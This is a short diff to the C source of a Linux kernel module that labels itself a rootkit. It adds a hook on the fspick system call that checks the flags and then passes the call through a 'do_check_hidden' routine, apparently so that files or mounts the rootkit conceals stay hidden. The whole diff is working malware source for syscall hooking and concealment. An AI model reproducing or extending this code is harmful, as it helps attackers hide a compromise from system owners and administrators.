@@ -4,6 +4,8 @@
 #include "syscall_hooks.h"
 #include <linux/fcntl.h>
 #include <linux/fs.h>
+#include <linux/mount.h>
+#include <linux/namei.h>
 #include <linux/printk.h>
 #include <linux/types.h>
 #include <linux/uaccess.h>
@@ -170,4 +172,28 @@ SYSCALL_HOOK_HANDLER3(sysfs, orig_sysfs, p_regs, int, i32_option, unsigned long,
     default:
         return -EINVAL;
     }
+}
+
+// sys_fspick syscall hook handler
+SYSCALL_HOOK_HANDLER3(fspick, orig_fspick, p_regs, int, i32_dfd, const char __user *, s_path,
+                      unsigned int, ui32_flags)
+{
+    int i32_at_flags = 0;
+
+    pr_info("[ROOTKIT] fspick(%d, %p, %#x)\n", i32_dfd, s_path, ui32_flags);
+
+    IF_U ((ui32_flags & ~(FSPICK_CLOEXEC | FSPICK_SYMLINK_NOFOLLOW | FSPICK_NO_AUTOMOUNT |
+                          FSPICK_EMPTY_PATH)) != 0) {
+        return -EINVAL;
+    }
+
+    if (ui32_flags & FSPICK_SYMLINK_NOFOLLOW) {
+        i32_at_flags |= AT_SYMLINK_NOFOLLOW;
+    }
+
+    if (ui32_flags & FSPICK_EMPTY_PATH) {
+        i32_at_flags |= AT_EMPTY_PATH;
+    }
+
+    return do_check_hidden(orig_fspick, p_regs, i32_dfd, s_path, i32_at_flags);
 }
